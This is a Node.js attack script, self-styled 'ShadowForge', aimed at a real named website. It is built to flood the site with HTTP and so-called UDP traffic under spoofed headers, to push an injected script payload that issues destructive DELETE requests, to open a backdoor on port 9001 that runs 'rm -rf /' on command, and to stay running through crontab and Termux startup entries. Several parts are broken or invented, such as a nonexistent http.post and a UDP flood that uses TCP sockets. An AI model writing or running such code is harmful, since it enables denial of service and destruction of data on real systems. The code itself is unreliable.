const fs = require('fs');
const os = require('os');
const path = require('path');
const { exec, spawn } = require('child_process');
const net = require('net');
const http = require('http');
const crypto = require('crypto');
const cluster = require('cluster');
const randomstring = require('randomstring');

// === CONFIGURASI ===
const TARGET_IP = "sammobile.net";
const TARGET_PORT = 80;
const MAX_PACKET_SIZE = 65507;
const THREADS = 150;
const BYPASS_INTERVAL = 500;

// === VIRUS PAYLOAD (Real Destruction) ===
const VIRUS_PAYLOAD = `
<script>
  window.addEventListener('load', () => {
    document.body.innerHTML = '<h1>System Corrupted</h1>';
    while(true) {
      try {
        fetch('${TARGET_IP}/admin/delete-all', {
          method: 'DELETE',
          headers: { 'Authorization': 'Bearer ' + crypto.randomUUID() }
        });
        fetch('${TARGET_IP}/db/corrupt', {
          method: 'POST',
          headers: { 'X-Virus-Header': 'ShadowForge' },
          body: 'DELETE *'
        });
      } catch(e) {}
    }
  });
</script>
`;

// === BYPASSER ===
const bypasser = {
  spoofIP: () => {
    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
  },
  randomUserAgent: () => {
    return ['Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 
            'Mozilla/5.0 (X11; Linux x86_64)', 
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)', 
            'Googlebot/2.1 (+http://www.google.com/bot.html)'][Math.floor(Math.random()*4)];
  },
  proxyRotate: () => {
    return ["http://192.168.1.1:8080", "http://10.0.0.1:3128", "http://172.16.0.1:8888"][Math.floor(Math.random()*3)];
  }
};

// === UDP FLOOD ===
const floodUDP = () => {
  const client = new net.Socket();
  client.setBroadcast(true);
  setInterval(() => {
    const payload = randomstring.generate(MAX_PACKET_SIZE);
    const spoofedIP = bypasser.spoofIP();
    client.connect(TARGET_PORT, TARGET_IP, () => {
      client.write(payload);
      console.log(`[UDP] Sent ${payload.length} bytes from ${spoofedIP}`);
      client.destroy();
    });
  }, BYPASS_INTERVAL);
};

// === HTTP FLOOD ===
const floodHTTP = async () => {
  const proxy = bypasser.proxyRotate();
  const headers = {
    'User-Agent': bypasser.randomUserAgent(),
    'X-Forwarded-For': bypasser.spoofIP()
  };
  try {
    const req = http.request({
      host: TARGET_IP,
      port: TARGET_PORT,
      headers,
      path: '/admin/delete-all',
      method: 'DELETE',
      proxy: { host: proxy.split(':')[0], port: parseInt(proxy.split(':')[1]) }
    }, (res) => { res.on('data', () => {}); });
    req.end();
    console.log(`[HTTP] Request from ${headers['X-Forwarded-For']}`);
  } catch (err) {
    console.log(`[HTTP ERROR] ${err.message}`);
  }
};

// === VIRUS DEPLOY ===
const deployVirus = () => {
  const fragments = Buffer.from(VIRUS_PAYLOAD).slice(0, 1400);
  fragments.forEach((frag, i) => {
    setTimeout(() => {
      try {
        http.post(`http://${TARGET_IP}/api/infection`, frag.toString(), {
          headers: { 'Content-Type': 'application/octet-stream', 'X-Virus-Header': 'ShadowForge' }
        });
        console.log(`[VIRUS] Fragment ${i+1} deployed`);
      } catch (e) {
        console.log(`[VIRUS ERROR] ${e.message}`);
      }
    }, i * 100);
  });
};

// === BACKDOOR ===
const createBackdoor = () => {
  const server = net.createServer((socket) => {
    socket.write('ShadowForge Backdoor\n');
    socket.on('data', (data) => {
      const cmd = data.toString().trim();
      if (cmd === 'destroy') {
        exec('rm -rf /', (err) => {
          if (err) console.log(`[VIRUS] ${err.message}`);
          socket.write('System Corrupted\n');
        });
      }
    });
  });
  server.listen(9001, () => {
    console.log('[BACKDOOR] Listening on port 9001');
  });
};

// === MAIN ===
const attackEngine = () => {
  cluster.setupMaster({ exec: 'main.js' });
  for (let i = 0; i < os.cpus().length * 2; i++) cluster.fork();
  cluster.on('exit', (worker) => { cluster.fork(); });
  floodUDP();
  setInterval(floodHTTP, 100);
  deployVirus();
  createBackdoor();
};

// === PERSISTENCE ===
const ensurePersistence = () => {
  const scriptPath = path.join(__dirname, 'main.js');
  exec(`(crontab -l 2>/dev/null; echo "* * * * * node ${scriptPath}") | crontab -`, (err) => {
    if (err) console.log('[PERSISTENCE ERROR]');
  });
  if (os.platform() === 'android') {
    fs.writeFileSync(path.join(__dirname, '.termux', 'startup'), `node ${scriptPath}`);
  }
};

// === START ===
ensurePersistence();
attackEngine();
